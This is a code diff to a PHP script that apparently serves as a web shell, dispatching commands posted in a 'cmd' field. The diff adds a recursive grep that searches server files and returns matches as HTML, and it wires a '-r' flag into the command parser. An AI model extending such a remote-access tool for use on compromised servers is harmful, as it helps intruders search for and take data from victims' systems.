@@ -85,36 +85,67 @@ if(isset($_POST['cmd'])) {
         //search for file with name in path
     }
 
-    function grep($search, $path) {
-        grep_file($search, $path);
-        /*
-        if file its file, cat it -> search for string, return
-        if file is folder, make for loop and grep for each file
-        */
+    function grep($search, $path, $recursive) {
+        if (file_exists($path)) {
+            if(is_file($path))
+                grep_file($search, $path);
+            else
+                grep_folder($search, $path, $recursive); 
+        }
+        else {
+            response(ERROR, "Folder path not found", true);
+        }
+        response(SUCCESS, "Done!", true);
     }
 
     function grep_file($search, $path) {
         $matches = array();
-
+        $response = "";
         $handle = @fopen($path, "r");
+        $line = 0;
         if ($handle)
         {
             while (!feof($handle))
             {
                 $buffer = fgets($handle);
-                if(strpos($buffer, $search) !== FALSE)
-                    $matches[] = $buffer;
+                $line++;
+                $position = strpos($buffer, $search); 
+                if( $position  !== FALSE) {
+                    $parts = explode($search, $buffer);
+                    $text_line = "";
+                    for($i = 0; $i < count($parts); $i++) {
+                        $text_line .= htmlentities($parts[$i]);
+                        if($i < count($parts) - 1)
+                            $text_line .= '<font color="red">' . htmlentities($search) . '</font>'; 
+                    }
+
+
+                    $response .= ' </font>'. '<font color="yellow"> ' . $line. ':</font> '. '<font color="grey">' . " " . $path . " : " . $text_line ."<br/>";
+                    response(SUCCESS, $response, false);
+                }   
             }
             fclose($handle);
         }
 
-        //show results:
-        print_r($matches);
-
     }
 
-    function grep_folder($search, $path) {
-
+    function grep_folder($search, $path, $recursive) {
+        if (file_exists($path)) {
+            $files = scandir($path);
+            $files = array_diff($files, array('.', '..'));
+            foreach ($files as $f) {
+                $f = $path ."/". $f ;
+                if(is_file($f)) { 
+                    grep_file($search, $f);
+                }
+                if(is_dir($f) && $recursive) {
+                    grep_folder($search, $f, $recursive); 
+                }
+            }
+        }
+        else {
+            response(ERROR, "Folder " .$path. " path not found", true);
+        }
     } 
 
     function logo() {
@@ -204,7 +235,9 @@ if(isset($_POST['cmd'])) {
             path_cmd();
             $search = $params[0];
             $path = $params[1];
-            grep($search, $path);
+            $recursive = false;
+            if(count($params) > 2 && $params[2] == "-r") $recursive = true;
+            grep($search, $path, $recursive);
             break;
         case 'download':
             path_cmd();
